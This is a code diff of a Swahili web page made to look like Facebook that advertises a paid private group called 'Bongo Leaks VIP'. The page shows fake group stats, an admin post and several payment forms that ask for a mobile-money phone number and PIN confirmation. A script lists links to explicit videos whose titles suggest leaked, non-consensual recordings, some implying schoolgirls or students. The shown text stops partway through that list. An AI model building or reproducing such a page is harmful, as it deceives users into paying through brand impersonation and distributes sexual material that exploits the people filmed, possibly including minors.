@@ -1,75 +1,55 @@
 <!DOCTYPE html>
-<html lang="sw">
+<html lang="sw" class="dark">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Facebook</title>
+    <title>Facebook • Bongo Leaks VIP</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
-        }
-
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
             background-color: #18191a;
             color: #e4e6eb;
-            overflow-x: hidden;
+            -webkit-font-smoothing: antialiased;
         }
 
-        /* Facebook Blue */
-        .fb-blue {
-            color: #1877f2;
-        }
-
-        .bg-fb-blue {
-            background-color: #1877f2;
-        }
-
-        /* Facebook Dark Theme Colors */
         .fb-card {
             background-color: #242526;
+            margin-bottom: 8px;
         }
 
-        .fb-hover:hover {
+        .fb-btn-blue {
+            background-color: #2d88ff;
+            color: white;
+        }
+
+        .fb-btn-gray {
             background-color: #3a3b3c;
+            color: #e4e6eb;
         }
 
-        .fb-border {
-            border-color: #3a3b3c;
-        }
-
-        .fb-text-secondary {
-            color: #b0b3b8;
-        }
-
-        /* Hide scrollbar */
-        ::-webkit-scrollbar {
+        .no-scrollbar::-webkit-scrollbar {
             display: none;
         }
 
-        body {
+        .no-scrollbar {
             -ms-overflow-style: none;
             scrollbar-width: none;
         }
 
-        /* Story ring */
-        .story-ring {
-            background: linear-gradient(45deg, #1877f2, #00c6ff);
-            padding: 2px;
-            border-radius: 50%;
+        .active-tap:active {
+            opacity: 0.7;
+            transform: scale(0.98);
         }
 
-        /* Video post modal */
+        /* Video Modal */
         .video-modal {
             position: fixed;
             inset: 0;
-            background: rgba(0, 0, 0, 0.9);
+            background: rgba(0, 0, 0, 0.95);
             z-index: 100;
             display: none;
             flex-direction: column;
@@ -79,12 +59,12 @@
             display: flex;
         }
 
-        /* Payment overlay */
+        /* Payment Overlay */
         .payment-overlay {
             position: absolute;
             inset: 0;
-            background: rgba(0, 0, 0, 0.85);
-            backdrop-filter: blur(8px);
+            background: rgba(0, 0, 0, 0.9);
+            backdrop-filter: blur(10px);
             display: none;
             flex-direction: column;
             align-items: center;
@@ -95,170 +75,136 @@
         .payment-overlay.show {
             display: flex;
         }
-
-        /* Reaction buttons */
-        .reaction-btn {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
-            flex: 1;
-            padding: 8px;
-            border-radius: 4px;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-
-        .reaction-btn:hover {
-            background: #3a3b3c;
-        }
     </style>
 </head>
 
-<body class="min-h-screen max-w-lg mx-auto">
+<body class="min-h-screen flex flex-col mx-auto max-w-md bg-[#18191a]">
 
-    <!-- Facebook Header -->
-    <header class="sticky top-0 z-50 fb-card px-3 py-2 flex items-center justify-between border-b fb-border">
-        <div class="flex items-center gap-2">
-            <svg viewBox="0 0 36 36" class="w-10 h-10" fill="#1877f2">
-                <path
-                    d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 4.991 2.029 9.505 5.307 12.763.167.167.395.238.624.194l4.157-.807a1 1 0 00.77-.61l.771-1.927a1 1 0 00-.146-.97 8.963 8.963 0 01-1.674-5.218c0-4.941 3.992-8.952 8.929-8.995 4.997-.043 9.072 4.007 9.072 8.996 0 1.883-.581 3.63-1.574 5.076a1 1 0 00-.13.954l.792 1.876a1 1 0 00.769.597l4.066.659c.228.037.455-.03.618-.197z">
-                </path>
-                <path fill="white"
-                    d="M24.5 18.5c0-3.59-2.91-6.5-6.5-6.5s-6.5 2.91-6.5 6.5c0 3.24 2.37 5.93 5.47 6.43v-4.55h-1.65v-1.88h1.65v-1.43c0-1.63.97-2.53 2.46-2.53.71 0 1.46.13 1.46.13v1.6h-.82c-.81 0-1.06.5-1.06 1.02v1.21h1.8l-.29 1.88h-1.51v4.55c3.1-.5 5.47-3.19 5.47-6.43z">
-                </path>
-            </svg>
-            <span class="text-2xl font-bold fb-blue">facebook</span>
+    <!-- Top Header -->
+    <nav class="sticky top-0 z-50 bg-[#242526] border-b border-[#393a3b]">
+        <div class="flex justify-between items-center px-4 py-2">
+            <h1 class="text-lg font-bold tracking-tight text-white flex items-center gap-2">
+                <i class="fas fa-arrow-left text-lg text-[#b0b3b8]"></i>
+                <span class="ml-1">Bongo Leaks 🔞 (VIP)</span>
+            </h1>
+            <div class="flex gap-4 text-xl text-[#e4e6eb]">
+                <i class="fas fa-search"></i>
+                <i class="fas fa-share"></i>
+                <i class="fas fa-bars"></i>
+            </div>
         </div>
-        <div class="flex items-center gap-2">
-            <button class="w-10 h-10 rounded-full bg-[#3a3b3c] flex items-center justify-center">
-                <i class="fas fa-search text-lg"></i>
-            </button>
-            <button class="w-10 h-10 rounded-full bg-[#3a3b3c] flex items-center justify-center relative">
-                <i class="fab fa-facebook-messenger text-lg"></i>
-                <span
-                    class="absolute -top-1 -right-1 bg-red-500 text-[10px] font-bold w-5 h-5 rounded-full flex items-center justify-center">3</span>
-            </button>
-        </div>
-    </header>
 
-    <!-- Navigation Tabs -->
-    <nav class="fb-card flex border-b fb-border">
-        <button class="flex-1 py-3 border-b-2 border-[#1877f2] text-[#1877f2]">
-            <i class="fas fa-home text-xl"></i>
-        </button>
-        <button class="flex-1 py-3 fb-text-secondary">
-            <i class="fas fa-tv text-xl"></i>
-        </button>
-        <button class="flex-1 py-3 fb-text-secondary">
-            <i class="fas fa-store text-xl"></i>
-        </button>
-        <button class="flex-1 py-3 fb-text-secondary">
-            <i class="fas fa-users text-xl"></i>
-        </button>
-        <button class="flex-1 py-3 fb-text-secondary relative">
-            <i class="fas fa-bell text-xl"></i>
-            <span
-                class="absolute top-1 right-4 bg-red-500 text-[10px] font-bold w-5 h-5 rounded-full flex items-center justify-center">9</span>
-        </button>
-        <button class="flex-1 py-3 fb-text-secondary">
-            <i class="fas fa-bars text-xl"></i>
-        </button>
+        <!-- Group Cover Area -->
+        <div class="relative h-36 w-full bg-gray-800">
+            <img src="/cover.png" class="w-full h-full object-cover"
+                onerror="this.src='https://images.unsplash.com/photo-1616091093747-4c8d1234a7ad?q=80&w=1000&auto=format&fit=crop'">
+            <div class="absolute inset-0 bg-gradient-to-t from-[#242526] via-transparent to-transparent"></div>
+            <div class="absolute bottom-2 left-4">
+                <h2 class="text-xl font-bold text-white drop-shadow-lg">BONGO LEAKS 🔞 (VIP)</h2>
+                <p class="text-xs text-white/80 font-medium flex items-center gap-1">
+                    <i class="fas fa-lock text-[10px]"></i> Private Group · 254K members
+                </p>
+            </div>
+        </div>
+
+        <!-- Group Actions -->
+        <div class="flex gap-2 px-4 py-3 bg-[#242526]">
+            <button
+                class="open-modal-trigger flex-1 fb-btn-blue font-bold py-2 rounded-md text-[15px] flex items-center justify-center gap-2 active-tap">
+                <i class="fas fa-plus"></i> Join Group
+            </button>
+            <button class="fb-btn-gray font-semibold px-4 py-2 rounded-md text-[15px] active-tap">
+                <i class="fas fa-bell"></i>
+            </button>
+            <button class="fb-btn-gray font-semibold px-4 py-2 rounded-md text-[15px] active-tap">
+                <i class="fas fa-ellipsis-h"></i>
+            </button>
+        </div>
+
+        <!-- Filter Tabs -->
+        <div
+            class="flex px-4 pb-0 bg-[#242526] overflow-x-auto no-scrollbar gap-6 text-[15px] font-semibold text-[#b0b3b8]">
+            <div class="text-[#2d88ff] border-b-[3px] border-[#2d88ff] pb-3 px-1">Featured</div>
+            <div class="pb-3 px-1 whitespace-nowrap">Reels</div>
+            <div class="pb-3 px-1 whitespace-nowrap">Photos</div>
+            <div class="pb-3 px-1 whitespace-nowrap">Files</div>
+            <div class="pb-3 px-1 whitespace-nowrap">Events</div>
+        </div>
     </nav>
 
-    <!-- Stories Section -->
-    <div class="fb-card p-3 mt-2">
-        <div class="flex gap-2 overflow-x-auto pb-2">
-            <!-- Create Story -->
-            <div class="min-w-[100px] h-[160px] rounded-xl bg-[#3a3b3c] overflow-hidden relative cursor-pointer">
-                <div class="h-[110px] bg-gradient-to-br from-[#1877f2] to-[#00c6ff]"></div>
-                <div
-                    class="absolute bottom-[45px] left-1/2 -translate-x-1/2 w-9 h-9 rounded-full bg-[#1877f2] border-4 border-[#242526] flex items-center justify-center">
-                    <i class="fas fa-plus text-white text-sm"></i>
+    <!-- Main Feed -->
+    <main class="flex-grow pt-2 pb-24">
+
+        <!-- Pinned Post -->
+        <div class="fb-card p-4">
+            <div class="flex items-center gap-1 text-[12px] text-[#b0b3b8] mb-3">
+                <i class="fas fa-thumbtack"></i>
+                <span>Pinned by Admin</span>
+            </div>
+            <div class="flex items-start justify-between mb-2">
+                <div class="flex gap-2">
+                    <div class="relative">
+                        <img src="https://ui-avatars.com/api/?name=Admin&background=dc2626&color=fff"
+                            class="w-10 h-10 rounded-full border border-[#3e4042]">
+                        <div class="absolute -bottom-1 -right-1 bg-[#242526] rounded-full p-0.5">
+                            <i class="fas fa-shield-alt text-[#2d88ff] text-xs"></i>
+                        </div>
+                    </div>
+                    <div>
+                        <h3 class="font-bold text-[15px] leading-tight">Admin Mkuu <i
+                                class="fas fa-check-circle text-[#2d88ff] text-xs ml-0.5"></i></h3>
+                        <p class="text-[12px] text-[#b0b3b8]">Admin · 2h · <i class="fas fa-users text-[10px]"></i></p>
+                    </div>
                 </div>
-                <div class="absolute bottom-2 w-full text-center text-xs font-medium">Create story</div>
+                <i class="fas fa-ellipsis-h text-[#b0b3b8]"></i>
             </div>
 
-            <!-- Story items -->
-            <div class="min-w-[100px] h-[160px] rounded-xl overflow-hidden relative cursor-pointer open-modal-trigger">
-                <img src="https://picsum.photos/200/300?random=1" class="w-full h-full object-cover">
-                <div class="absolute top-2 left-2 story-ring w-10 h-10">
-                    <img src="https://ui-avatars.com/api/?name=VL&background=1877f2&color=fff"
-                        class="w-full h-full rounded-full border-2 border-[#242526]">
-                </div>
-                <div class="absolute bottom-0 left-0 right-0 bg-gradient-to-t from-black/80 to-transparent p-2 pt-6">
-                    <p class="text-xs font-medium">Leaks VIP 🔥</p>
-                </div>
-            </div>
+            <p class="text-[14px] mb-3">
+                🔥 <strong>KARIBU BONGO LEAKS VIP!</strong> 🔥<br><br>
+                Hapa tunapost video zote za moto zilizofutwa Instagram na TikTok.
+                Jiunge sasa kwa <strong>TSH 1,000</strong> tu kupata lifetime access!<br><br>
+                ✅ Video 52+<br>
+                ✅ Updates za kila siku<br>
+                ✅ Download bila limit
+            </p>
 
-            <div class="min-w-[100px] h-[160px] rounded-xl overflow-hidden relative cursor-pointer open-modal-trigger">
-                <img src="https://picsum.photos/200/300?random=2" class="w-full h-full object-cover">
-                <div class="absolute top-2 left-2 story-ring w-10 h-10">
-                    <img src="https://ui-avatars.com/api/?name=TZ&background=1877f2&color=fff"
-                        class="w-full h-full rounded-full border-2 border-[#242526]">
-                </div>
-                <div class="absolute bottom-0 left-0 right-0 bg-gradient-to-t from-black/80 to-transparent p-2 pt-6">
-                    <p class="text-xs font-medium">Bongo Leaks</p>
-                </div>
-            </div>
-
-            <div class="min-w-[100px] h-[160px] rounded-xl overflow-hidden relative cursor-pointer open-modal-trigger">
-                <img src="https://picsum.photos/200/300?random=3" class="w-full h-full object-cover">
-                <div class="absolute top-2 left-2 story-ring w-10 h-10">
-                    <img src="https://ui-avatars.com/api/?name=HT&background=1877f2&color=fff"
-                        class="w-full h-full rounded-full border-2 border-[#242526]">
-                </div>
-                <div class="absolute bottom-0 left-0 right-0 bg-gradient-to-t from-black/80 to-transparent p-2 pt-6">
-                    <p class="text-xs font-medium">Hot Videos 💦</p>
-                </div>
-            </div>
+            <button
+                class="open-modal-trigger w-full fb-btn-blue py-2.5 rounded-md font-bold text-sm flex items-center justify-center gap-2">
+                <i class="fas fa-unlock"></i> JIUNGE SASA - TSH 1,000
+            </button>
         </div>
-    </div>
 
-    <!-- Create Post Bar -->
-    <div class="fb-card p-3 mt-2 flex items-center gap-3">
-        <div class="w-10 h-10 rounded-full bg-[#3a3b3c] flex items-center justify-center">
-            <i class="fas fa-user text-lg fb-text-secondary"></i>
-        </div>
-        <button class="flex-1 bg-[#3a3b3c] rounded-full py-2 px-4 text-left fb-text-secondary text-sm">
-            What's on your mind?
-        </button>
-    </div>
+        <!-- Video Posts Container -->
+        <div id="video-list-container"></div>
 
-    <!-- Posts Feed -->
-    <div id="posts-container" class="mt-2 pb-24 space-y-2">
-        <!-- Posts will be generated by JS -->
-    </div>
+    </main>
 
-    <!-- Floating Subscribe Button -->
-    <div class="fixed bottom-4 left-4 right-4 z-40 max-w-lg mx-auto">
+    <!-- Floating Join Button -->
+    <div class="fixed bottom-6 left-4 right-4 z-40 max-w-md mx-auto">
         <button
-            class="open-modal-trigger w-full bg-fb-blue hover:bg-[#166fe5] text-white font-semibold py-3 rounded-lg shadow-lg flex items-center justify-center gap-2 text-sm">
-            <i class="fas fa-unlock"></i> Join VIP Group - TSH 1,000
+            class="open-modal-trigger w-full bg-[#2d88ff] hover:bg-[#1a7cf0] text-white font-bold py-3 rounded-lg shadow-lg flex items-center justify-center gap-2 text-[15px] active-tap">
+            <i class="fas fa-users"></i> Join VIP Group - TSH 1,000
         </button>
     </div>
 
-    <!-- Video Post Modal -->
+    <!-- VIDEO MODAL -->
     <div id="video-modal" class="video-modal">
         <!-- Modal Header -->
-        <div class="fb-card flex items-center justify-between px-4 py-3 border-b fb-border">
+        <div class="bg-[#242526] flex items-center justify-between px-4 py-3 border-b border-[#393a3b]">
             <div class="flex items-center gap-3">
-                <div
-                    class="w-10 h-10 rounded-full bg-gradient-to-br from-[#1877f2] to-[#00c6ff] flex items-center justify-center">
-                    <span class="text-white font-bold text-sm">VL</span>
-                </div>
+                <img src="https://ui-avatars.com/api/?name=VL&background=2d88ff&color=fff"
+                    class="w-10 h-10 rounded-full">
                 <div>
-                    <p class="font-semibold text-sm flex items-center gap-1">
-                        Viral Leaks TZ
-                        <i class="fas fa-check-circle fb-blue text-xs"></i>
+                    <p class="font-bold text-[15px] flex items-center gap-1">
+                        Bongo Leaks VIP
+                        <i class="fas fa-check-circle text-[#2d88ff] text-xs"></i>
                     </p>
-                    <p class="text-xs fb-text-secondary flex items-center gap-1">
-                        <span id="modal-time">2h</span> · <i class="fas fa-globe-africa text-[10px]"></i>
+                    <p class="text-[12px] text-[#b0b3b8]" id="modal-time">2h · <i class="fas fa-users text-[10px]"></i>
                     </p>
                 </div>
             </div>
-            <button id="close-modal" class="w-10 h-10 rounded-full bg-[#3a3b3c] flex items-center justify-center">
-                <i class="fas fa-times text-xl"></i>
+            <button id="close-video-modal" class="w-10 h-10 rounded-full bg-[#3a3b3c] flex items-center justify-center">
+                <i class="fas fa-times text-xl text-[#e4e6eb]"></i>
             </button>
         </div>
 
@@ -267,61 +213,56 @@
             <video id="modal-video" class="w-full max-h-[60vh] object-contain" loop muted playsinline></video>
 
             <!-- Payment Overlay -->
-            <div id="payment-overlay" class="payment-overlay">
-                <div class="w-20 h-20 rounded-full bg-[#1877f2] flex items-center justify-center mb-4">
+            <div id="video-payment-overlay" class="payment-overlay">
+                <div class="w-20 h-20 rounded-full bg-[#2d88ff] flex items-center justify-center mb-4">
                     <i class="fas fa-lock text-white text-3xl"></i>
                 </div>
                 <h2 class="text-xl font-bold mb-2">Video Imefungwa 🔒</h2>
-                <p class="fb-text-secondary text-sm mb-4 text-center">Jiunge na VIP Group kuona video zote</p>
+                <p class="text-[#b0b3b8] text-sm mb-4 text-center">Jiunge na VIP Group kuona video zote</p>
 
-                <div class="w-full max-w-[280px] fb-card rounded-xl p-4">
-                    <div class="flex items-center justify-between mb-3">
-                        <span class="fb-text-secondary text-sm">Malipo ya mara moja</span>
+                <div class="w-full max-w-[300px] bg-[#242526] rounded-xl p-4 border border-[#393a3b]">
+                    <div class="flex items-center justify-between mb-3 pb-3 border-b border-[#393a3b]">
+                        <span class="text-[#b0b3b8] text-sm">Malipo ya mara moja</span>
                         <span class="text-xl font-bold">TSH 1,000</span>
                     </div>
 
-                    <div id="payment-form-view">
-                        <form id="payment-form" class="space-y-3">
-                            <div class="relative">
-                                <i
-                                    class="fas fa-phone absolute left-3 top-1/2 -translate-y-1/2 fb-text-secondary text-sm"></i>
-                                <input type="tel" id="phone"
-                                    class="w-full bg-[#3a3b3c] border-none rounded-lg pl-10 pr-3 py-3 text-white text-sm focus:ring-2 focus:ring-[#1877f2] focus:outline-none text-center"
-                                    placeholder="07XXXXXXXX" required pattern="0[6-7][0-9]{8}" inputmode="numeric">
-                            </div>
+                    <div id="video-payment-form-view">
+                        <form id="video-payment-form" class="space-y-3">
+                            <input type="tel" id="video-phone"
+                                class="w-full bg-[#3a3b3c] border border-[#4e4f50] rounded-lg px-4 py-3 text-white text-center focus:outline-none focus:border-[#2d88ff]"
+                                placeholder="07XXXXXXXX" required pattern="0[6-7][0-9]{8}" inputmode="numeric">
                             <button type="submit"
-                                class="w-full bg-fb-blue hover:bg-[#166fe5] text-white font-bold py-3 rounded-lg text-sm flex items-center justify-center gap-2 transition">
-                                <i class="fas fa-credit-card"></i> Lipa Sasa
+                                class="w-full fb-btn-blue py-3 rounded-lg font-bold text-[15px] flex items-center justify-center gap-2 active-tap">
+                                <i class="fas fa-credit-card"></i> LIPA SASA
                             </button>
                         </form>
-                        <div class="mt-3 flex items-center justify-center gap-2 text-[11px] fb-text-secondary">
+                        <div class="mt-3 flex items-center justify-center gap-2 text-[11px] text-[#b0b3b8]">
                             <i class="fas fa-shield-alt"></i>
                             <span>M-Pesa · Tigo Pesa · Airtel Money</span>
                         </div>
                     </div>
 
-                    <div id="payment-waiting" class="hidden py-4 text-center">
+                    <div id="video-payment-waiting" class="hidden py-4 text-center">
                         <div
-                            class="w-10 h-10 border-2 border-[#3a3b3c] border-t-[#1877f2] rounded-full animate-spin mx-auto mb-4">
+                            class="w-10 h-10 border-4 border-[#3a3b3c] border-t-[#2d88ff] rounded-full animate-spin mx-auto mb-4">
                         </div>
                         <p class="font-semibold">Inasubiri malipo...</p>
-                        <p class="text-sm fb-text-secondary mt-1"><i class="fas fa-mobile-alt mr-1"></i> Weka PIN kwenye
+                        <p class="text-sm text-[#b0b3b8] mt-1"><i class="fas fa-mobile-alt mr-1"></i> Weka PIN kwenye
                             simu</p>
                     </div>
                 </div>
             </div>
         </div>
 
-        <!-- Post Caption -->
-        <div class="fb-card p-4 border-t fb-border">
-            <p id="modal-caption" class="text-sm mb-3"></p>
+        <!-- Post Engagement -->
+        <div class="bg-[#242526] p-4 border-t border-[#393a3b]">
+            <p id="modal-caption" class="text-[14px] mb-3"></p>
 
-            <!-- Reactions Summary -->
-            <div class="flex items-center justify-between text-sm fb-text-secondary pb-3 border-b fb-border">
+            <div class="flex items-center justify-between text-[12px] text-[#b0b3b8] pb-3 border-b border-[#393a3b]">
                 <div class="flex items-center gap-1">
                     <div class="flex -space-x-1">
                         <span
-                            class="w-5 h-5 rounded-full bg-[#1877f2] flex items-center justify-center text-[10px]">👍</span>
+                            class="w-5 h-5 rounded-full bg-[#2d88ff] flex items-center justify-center text-[10px]">👍</span>
                         <span
                             class="w-5 h-5 rounded-full bg-red-500 flex items-center justify-center text-[10px]">❤️</span>
                         <span
@@ -335,178 +276,215 @@
                 </div>
             </div>
 
-            <!-- Reaction Buttons -->
             <div class="flex pt-2">
-                <button class="reaction-btn fb-text-secondary">
+                <button
+                    class="flex-1 py-2 flex items-center justify-center gap-2 text-[#b0b3b8] rounded hover:bg-[#3a3b3c]">
                     <i class="far fa-thumbs-up text-lg"></i>
-                    <span class="text-sm">Like</span>
+                    <span class="text-[13px]">Like</span>
                 </button>
-                <button class="reaction-btn fb-text-secondary">
+                <button
+                    class="flex-1 py-2 flex items-center justify-center gap-2 text-[#b0b3b8] rounded hover:bg-[#3a3b3c]">
                     <i class="far fa-comment text-lg"></i>
-                    <span class="text-sm">Comment</span>
+                    <span class="text-[13px]">Comment</span>
                 </button>
-                <button class="reaction-btn fb-text-secondary">
-                    <i class="far fa-share-square text-lg"></i>
-                    <span class="text-sm">Share</span>
+                <button
+                    class="flex-1 py-2 flex items-center justify-center gap-2 text-[#b0b3b8] rounded hover:bg-[#3a3b3c]">
+                    <i class="fas fa-share text-lg"></i>
+                    <span class="text-[13px]">Share</span>
                 </button>
             </div>
         </div>
     </div>
 
     <!-- General Payment Modal -->
-    <div id="general-modal" class="fixed inset-0 bg-black/70 z-[100] hidden flex items-center justify-center p-6">
-        <div id="general-modal-box"
-            class="fb-card w-full max-w-sm rounded-xl overflow-hidden shadow-2xl transform scale-95 opacity-0 transition-all duration-200">
-            <div class="bg-[#1877f2] px-4 py-3 flex items-center justify-between">
-                <div class="flex items-center gap-2">
-                    <i class="fas fa-users text-2xl text-white"></i>
-                    <span class="font-bold text-white">VIP Group</span>
-                </div>
-                <button id="close-general-modal" class="text-white/80 hover:text-white">
-                    <i class="fas fa-times text-xl"></i>
+    <div id="payment-modal"
+        class="fixed inset-0 bg-black/70 z-[100] hidden flex items-center justify-center p-4 backdrop-blur-sm">
+        <div id="payment-box"
+            class="bg-[#242526] w-full max-w-sm rounded-xl overflow-hidden shadow-2xl transform scale-95 opacity-0 transition-all duration-200 border border-[#393a3b]">
+
+            <div class="border-b border-[#393a3b] p-4 flex justify-between items-center">
+                <h2 class="text-lg font-bold text-[#e4e6eb]">Join VIP Group</h2>
+                <button id="close-modal"
+                    class="w-8 h-8 rounded-full bg-[#3a3b3c] flex items-center justify-center text-[#b0b3b8]">
+                    <i class="fas fa-times"></i>
                 </button>
             </div>
-            <div class="p-5 text-center">
-                <div class="w-20 h-20 mx-auto mb-4 rounded-full bg-[#1877f2]/20 flex items-center justify-center">
-                    <i class="fas fa-lock fb-blue text-3xl"></i>
-                </div>
-                <h2 class="text-lg font-bold mb-2">Jiunge na VIP Group</h2>
-                <p class="fb-text-secondary text-sm mb-4">Pata video zote 52+ za exclusive</p>
 
-                <div class="bg-[#3a3b3c] rounded-xl p-4 mb-4">
-                    <div class="flex items-center justify-between">
-                        <span class="fb-text-secondary">Bei</span>
+            <div class="p-4">
+                <div class="flex items-center gap-3 mb-4 bg-[#2d88ff]/10 p-3 rounded-lg border border-[#2d88ff]/20">
+                    <i class="fas fa-lock text-[#2d88ff] text-xl"></i>
+                    <div>
+                        <h3 class="font-bold text-[14px]">Private Content</h3>
+                        <p class="text-[12px] text-[#b0b3b8]">Lipa TSH 1,000 kuona video zote 52+</p>
+                    </div>
+                </div>
+
+                <div class="bg-[#3a3b3c] rounded-lg p-3 mb-4">
+                    <div class="flex justify-between items-center">
+                        <span class="text-[#b0b3b8]">Bei</span>
                         <span class="text-2xl font-bold">TSH 1,000</span>
                     </div>
-                    <div class="flex justify-center gap-4 mt-2 text-xs fb-text-secondary">
+                    <div class="flex justify-center gap-4 mt-2 text-[11px] text-[#b0b3b8]">
                         <span><i class="fas fa-video mr-1"></i> 52+ Videos</span>
                         <span><i class="fas fa-infinity mr-1"></i> Lifetime</span>
                     </div>
                 </div>
 
-                <div id="general-form-view">
-                    <form id="general-payment-form" class="space-y-3">
-                        <input type="tel" id="general-phone"
-                            class="w-full bg-[#3a3b3c] border-none rounded-lg px-4 py-3 text-white text-center focus:ring-2 focus:ring-[#1877f2] focus:outline-none"
+                <div id="form-view">
+                    <form id="payment-form" class="space-y-3">
+                        <input type="tel" id="phone" name="phone"
+                            class="w-full bg-[#3a3b3c] border border-[#4e4f50] rounded-lg px-4 py-3 text-white text-center focus:outline-none focus:border-[#2d88ff]"
                             placeholder="07XXXXXXXX" required pattern="0[6-7][0-9]{8}" inputmode="numeric">
                         <button type="submit"
-                            class="w-full bg-fb-blue hover:bg-[#166fe5] text-white font-bold py-3 rounded-lg transition">
-                            <i class="fas fa-credit-card mr-2"></i>Lipa & Jiunge
+                            class="w-full fb-btn-blue py-3 rounded-lg font-bold text-[15px] active-tap">
+                            <i class="fas fa-users mr-2"></i>Jiunge & Tazama
                         </button>
                     </form>
+                    <p class="text-center text-[11px] text-[#b0b3b8] mt-3">Malipo ya mara moja. Lifetime access.</p>
                 </div>
 
-                <div id="general-waiting" class="hidden py-6">
+                <div id="waiting-view" class="hidden py-6 text-center">
                     <div
-                        class="w-10 h-10 border-2 border-[#3a3b3c] border-t-[#1877f2] rounded-full animate-spin mx-auto mb-4">
+                        class="w-10 h-10 border-4 border-[#3a3b3c] border-t-[#2d88ff] rounded-full animate-spin mx-auto mb-4">
                     </div>
-                    <p class="font-semibold">Inasubiri malipo...</p>
+                    <h3 class="font-bold text-[16px]">Inasubiri malipo...</h3>
+                    <p class="text-[13px] text-[#b0b3b8] mt-1">Weka PIN kwenye simu yako</p>
                 </div>
             </div>
         </div>
     </div>
 
     <script>
+        // Video data - 31 videos with titles
         const videos = [
-            { src: "https://www.empressleak.xyz/media/videos/tmb/7925/video.webm", title: "Teen high school girl wasnt spared 1 🔥" },
-            { src: "https://www.empressleak.xyz/media/videos/tmb/7930/video.webm", title: "Handjob plus rimming; pedicure happy ending 💦" },
-            { src: "https://www.empressleak.xyz/media/videos/tmb/7907/video.webm", title: "Beki tatu wa mbunge akiliwa na shamba boy 😱" },
-            { src: "https://www.empressleak.xyz/media/videos/tmb/7898/video.webm", title: "Secretari akiliwa mzigo na bosi wake 🔥" },
-            { src: "https://www.empressleak.xyz/media/videos/tmb/7880/video.webm", title: "Mchungaji amtomba mke wa mtu chooni 🤫" },
-            { src: "https://www.empressleak.xyz/media/videos/tmb/7864/video.webm", title: "Mwalimu akimpelekea moto mwanafunzi 📚" },
-            { src: "https://www.empressleak.xyz/media/videos/tmb/7847/video.webm", title: "Mke wa mtu akipiga nyeto na mchepuko 💔" },
-            { src: "https://www.empressleak.xyz/media/videos/tmb/7842/video.webm", title: "Mubaba akitomba Gen Z wake live! 🔴" },
-            { src: "https://www.empressleak.xyz/media/videos/tmb/7840/video.webm", title: "Liwa uroda kisa deni la kausha damu 💰" },
-            { src: "https://www.empressleak.xyz/media/videos/tmb/7814/video.webm", title: "Kitoto cha 2000 na Mshangazi wake 😈" },
-            { src: "https://www.empressleak.xyz/media/videos/tmb/7805/video.webm", title: "Mitombano uswahili full video 🇹🇿" },
-            { src: "https://www.empressleak.xyz/media/videos/tmb/7790/video.webm", title: "Jamaa anapeleka moto chooni 🚽" },
-            { src: "https://www.empressleak.xyz/media/videos/tmb/7792/video.webm", title: "Mke wa pastor na mchepuko wake gesti 🔥" },
-            { src: "https://www.empressleak.xyz/media/videos/tmb/7783/video.webm", title: "Mtungo ghetto na mwanafunzi wa Dodoma 🎓" },
-            { src: "https://www.empressleak.xyz/media/videos/tmb/7705/video.webm", title: "Rehema wa UDSM na bwanaake video 🎬" },
-            { src: "https://www.empressleak.xyz/media/videos/tmb/7681/video.webm", title: "Ukiskia mke katombwa ndo huku sasa 😱" },
-            { src: "https://www.empressleak.xyz/media/videos/tmb/7650/video.webm", title: "Kijana wa Sinza kwa iPhone na mshangazi 📱" },
-            { src: "https://www.empressleak.xyz/media/videos/tmb/7636/video.webm", title: "Dada wa masaji saluni na kibententi 💇" },
-            { src: "https://www.empressleak.xyz/media/videos/tmb/7585/video.webm", title: "Baamedi wa Arusha rasta doggy 🔥" },
-            { src: "https://www.empressleak.xyz/media/videos/tmb/7460/video.webm", title: "Mshangazi boss mjini na kijana wake 💦" }
+            { src: "https://www.empressleak.xyz/media/videos/tmb/7088/video.webm", title: "Teen high school girl wasnt spared 1 🔥" },
+            { src: "https://www.empressleak.xyz/media/videos/tmb/7093/video.webm", title: "Handjob plus rimming; pedicure happy ending 💦" },
+            { src: "https://www.empressleak.xyz/media/videos/tmb/7079/video.webm", title: "Beki tatu wa mbunge akiliwa na shamba boy 😱" },
+            { src: "https://www.empressleak.xyz/media/videos/tmb/7071/video.webm", title: "Secretari akiliwa mzigo na bosi wake 🔥" },
+            { src: "https://www.empressleak.xyz/media/videos/tmb/7065/video.webm", title: "Mchungaji amtomba mke wa mtu chooni 🤫" },
+            { src: "https://www.empressleak.xyz/media/videos/tmb/7057/video.webm", title: "Mwalimu akimpelekea moto mwanafunzi 📚" },
+            { src: "https://www.empressleak.xyz/media/videos/tmb/7055/video.webm", title: "Mke wa mtu akipiga nyeto na mchepuko 💔" },
+            { src: "https://www.empressleak.xyz/media/videos/tmb/7054/video.webm", title: "Mubaba akitomba Gen Z wake live! 🔴" },
+            { src: "https://www.empressleak.xyz/media/videos/tmb/7045/video.webm", title: "Liwa uroda kisa deni la kausha damu 💰" },
+            { src: "https://www.empressleak.xyz/media/videos/tmb/7042/video.webm", title: "Kitoto cha 2000 na Mshangazi wake 😈" },
+            { src: "https://www.empressleak.xyz/media/videos/tmb/7037/video.webm", title: "Mitombano uswahili full video 🇹🇿" },
+            { src: "https://www.empressleak.xyz/media/videos/tmb/7038/video.webm", title: "Jamaa anapeleka moto chooni 🚽" },
+            { src: "https://www.empressleak.xyz/media/videos/tmb/7035/video.webm", title: "Mke wa pastor na mchepuko wake gesti 🔥" },
+            { src: "https://www.empressleak.xyz/media/videos/tmb/7030/video.webm", title: "Mtungo ghetto na mwanafunzi wa Dodoma 🎓" },
+            { src: "https://www.empressleak.xyz/media/videos/tmb/7027/video.webm", title: "Rehema wa UDSM na bwanaake video 🎬" },
